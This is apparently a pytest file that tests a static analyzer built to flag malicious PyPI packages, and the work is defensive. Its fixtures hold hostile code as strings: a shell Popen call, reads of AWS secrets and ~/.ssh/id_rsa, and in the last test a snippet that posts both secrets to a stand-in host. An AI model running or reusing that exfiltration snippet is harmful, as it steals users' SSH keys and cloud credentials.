from app.analysis.analyzers.base import PackageContext, SourceFile
from app.analysis.analyzers.static_code import StaticCodeAnalyzer
from app.analysis.signals import Code

analyzer = StaticCodeAnalyzer()


def _ctx(text: str, name="mod.py") -> PackageContext:
    return PackageContext(
        ecosystem="pypi", name="x", version="1.0",
        files=[SourceFile(relpath=name, text=text, size=len(text))],
    )


def _codes(signals):
    return {s.code for s in signals}


def test_detects_credential_harvesting():
    src = "import os\nsecret = os.environ['AWS_SECRET_ACCESS_KEY']\n"
    codes = _codes(analyzer.analyze(_ctx(src)))
    assert Code.ENV_HARVEST in codes


def test_detects_subprocess_and_network():
    src = (
        "import subprocess, requests\n"
        "subprocess.Popen(['sh','-c','id'])\n"
        "requests.post('http://x/y', data={})\n"
    )
    codes = _codes(analyzer.analyze(_ctx(src)))
    assert Code.SUBPROCESS_EXEC in codes
    assert Code.NETWORK_EGRESS in codes


def test_detects_dynamic_exec():
    codes = _codes(analyzer.analyze(_ctx("exec('print(1)')\neval('2')\n")))
    assert Code.DYNAMIC_EXEC in codes


def test_clean_code_has_no_high_severity_signals():
    src = "def add(a, b):\n    return a + b\n"
    signals = analyzer.analyze(_ctx(src))
    assert Code.ENV_HARVEST not in _codes(signals)
    assert Code.SUBPROCESS_EXEC not in _codes(signals)
    assert Code.DYNAMIC_EXEC not in _codes(signals)


def test_unparseable_file_is_signal_not_crash():
    # Deliberately broken syntax must not raise.
    signals = analyzer.analyze(_ctx("def (:\n  pass"))
    assert Code.UNPARSEABLE in _codes(signals)


def test_sensitive_path_reference():
    src = "open('/home/user/.ssh/id_rsa').read()\n"
    assert Code.FS_SENSITIVE in _codes(analyzer.analyze(_ctx(src)))


def test_deeply_nested_valid_file_cannot_suppress_findings_from_other_files():
    """Regression: a recursive NodeVisitor raised RecursionError on a 1000-term expression, the analyzer
    crashed, and every credential-access finding of the package was replaced by one ANALYZER_ERROR."""
    import concurrent.futures as cf

    padding = "TABLE = 0" + " + 1" * 1000 + "\n"
    core = (
        "import os, requests\n"
        "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
        "secret = os.environ['AWS_SECRET_ACCESS_KEY']\n"
        "requests.post('https://example.invalid/collect', data=key + secret)\n"
    )
    ctx = PackageContext(ecosystem="pypi", name="zqxwvhelper", version="1.0", files=[
        SourceFile(relpath="zqxwvhelper/_table.py", text=padding, size=len(padding)),
        SourceFile(relpath="zqxwvhelper/core.py", text=core, size=len(core)),
    ])
    with cf.ThreadPoolExecutor(max_workers=1) as pool:  # analyzers run in worker threads in production
        signals = pool.submit(analyzer.analyze, ctx).result()
    codes = _codes(signals)
    assert {Code.ENV_HARVEST, Code.FS_SENSITIVE, Code.NETWORK_EGRESS} <= codes
    assert Code.UNPARSEABLE not in codes
    env = next(s for s in signals if s.code == Code.ENV_HARVEST)
    assert env.location.file == "zqxwvhelper/core.py" and env.location.line == 3
